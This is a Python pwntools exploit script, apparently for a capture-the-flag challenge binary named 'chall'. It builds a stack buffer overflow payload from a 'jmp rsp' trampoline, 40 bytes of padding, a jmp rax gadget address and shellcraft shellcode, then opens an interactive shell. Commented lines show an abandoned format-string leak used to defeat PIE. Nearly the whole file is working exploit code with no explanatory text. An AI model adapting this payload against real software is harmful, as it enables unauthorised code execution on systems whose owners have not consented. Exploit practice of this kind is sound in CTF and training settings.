from pwn import *

elf = context.binary = ELF('./chall')
p = process()

def leak(data):
    p.sendlineafter('Help me: ', '2')
    p.sendlineafter('Typhoeus, shoot it!!\n', data)
    # p.sendline(data)
    
# def trigger():
#     p.sendlineafter(b'Help me: ', b'1')
#     p.recvuntil(b'here: ')
#     return p.recvline().strip()

# leak("%15$p")

# main_leak = int(trigger(), 16)
# log.success('main: %#x', main_leak)
# pie = main_leak - elf.sym['main']
# log.success('pie: %#x', pie)

# elf.address = pie
#jmp_rax = elf.address + 0x110f
jmp_rax = 0x4010fc
trampoline = asm('jmp rsp')
payload = trampoline.ljust(40, b'A')
payload += p64(jmp_rax)
payload += asm('sub rsp, 0x100') + asm(shellcraft.sh())

leak(payload) 
p.interactive()